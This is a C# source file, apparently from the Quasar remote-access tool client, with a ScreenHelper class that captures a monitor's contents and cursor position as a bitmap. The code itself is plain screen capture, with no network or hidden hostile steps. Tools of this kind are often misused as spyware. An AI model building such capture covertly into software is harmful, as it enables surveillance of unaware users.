using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Quasar.Client.Utilities;

namespace Quasar.Client.Helper
{
    public static class ScreenHelper
    {
        public static Bitmap CaptureScreen(int screenNumber)
        {
            Rectangle bounds = GetBounds(screenNumber);
            Bitmap screen = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppPArgb);

            using (Graphics g = Graphics.FromImage(screen))
            {
                g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
                CaptureCursor(g, bounds);
            }

            return screen;
        }

        public static Rectangle GetBounds(int screenNumber)
        {
            return Screen.AllScreens[screenNumber].Bounds;
        }

        private static void CaptureCursor(Graphics g, Rectangle bounds)
        {
            Cursor cursor = Cursors.Default;
            Point cursorPosition = Cursor.Position;

            cursorPosition.Offset(-bounds.X, -bounds.Y);

            cursor.Draw(g, new Rectangle(cursorPosition, cursor.Size));
        }
    }
}
